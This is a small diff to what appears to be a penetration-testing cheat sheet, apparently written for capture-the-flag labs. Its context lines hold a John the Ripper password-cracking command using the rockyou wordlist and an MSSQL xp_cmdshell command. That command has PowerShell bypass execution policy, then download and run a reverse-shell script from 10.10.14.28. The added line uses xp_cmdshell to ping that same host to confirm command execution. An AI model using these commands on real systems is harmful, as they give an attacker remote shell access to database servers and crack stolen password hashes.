@@ -27,3 +27,4 @@ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
 [+] MSSQL Get Reverse Shell
 ==============================================================================
 EXEC xp_cmdshell 'powershell.exe -exec bypass -C "IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.28/Invoke-PowerShellTcp2.ps1');"
+EXEC xp_cmdshell 'ping 10.10.14.28 -n1'--
